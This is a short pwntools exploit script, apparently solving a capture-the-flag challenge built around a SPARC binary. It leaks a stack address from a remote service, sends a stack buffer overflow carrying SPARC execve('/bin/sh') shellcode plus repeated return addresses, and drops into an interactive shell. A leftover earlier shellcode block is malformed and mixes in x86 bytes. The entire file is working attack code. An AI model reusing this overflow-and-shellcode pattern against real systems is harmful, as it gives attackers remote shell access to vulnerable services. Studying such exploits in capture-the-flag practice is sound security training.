from pwn import *

# r = process('qemu-sparc -strace -D test0 ./sparc-1', shell=True)
r = remote("0.0.0.0", 4444)
# r = remote("flu.xxx", 2020)

stack_addr = int(r.recvline_contains("0x")[2:],16)
print(hex(stack_addr))

shellcode = b"\x90\x90\xeb\x34\x21\x0b\xd8\x9a\xa0\x14\x21\x6e\x23\x0b\xcb\xdc"
b"\xa2\x14\x63\x68\xe0\x3b\xbf\xf0\xc0\x23\xbf\xf8\x90\x23\xa0\x10"
b"\xc0\x23\xbf\xec\xd0\x23\xbf\xe8\x92\x23\xa0\x18\x94\x22\x80\x0a"
b"\x82\x10\x20\x3b\x91\xd0\x20\x08"
b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

shellcode = b"\x90\x1a\x40\x09\x82\x10\x20\x17\x91\xd0\x20\x10\x90\x1a\x40\x09\x82\x10\x20\x2e\x91\xd0\x20\x10\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0\xd0\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\x91\xd0\x20\x10"

payload = b"\x01\x00\x00\x00" * ((176//4) - 18)
payload += shellcode
payload += p32(stack_addr, endian='big') * 5
# payload += b'A'*100
# payload += shellcode
# payload += p32(stack_addr, endian='big') * 40

r.sendline(payload)
# r.sendline('A'*448)
# r.sendline(b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaad")

r.sendline('A')

r.interactive()


